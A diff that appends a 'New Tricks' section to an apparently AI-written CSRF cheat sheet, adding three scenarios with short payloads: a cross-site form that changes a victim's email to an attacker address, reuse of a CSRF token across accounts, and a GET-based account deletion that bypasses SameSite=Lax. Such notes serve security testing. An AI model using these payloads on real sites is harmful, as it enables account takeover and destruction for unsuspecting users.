@@ -129,3 +129,17 @@ HTML
     
 
 **Would you like me to create a specific proof-of-concept template for any of these individual techniques?**
+
+## New Tricks
+
+### Trick 1
+- Scenario: State-changing JSON endpoint accepted cross-site simple POST form.
+- Payload: `<form action="https://target.com/api/email" method="POST"><input name="email" value="pwn@attacker.tld"></form>`
+
+### Trick 2
+- Scenario: CSRF token validated but not bound to user session.
+- Payload: `reuse token from account A in account B request`
+
+### Trick 3
+- Scenario: SameSite=Lax bypassed through top-level GET state change endpoint.
+- Payload: `GET /account/delete?confirm=1`
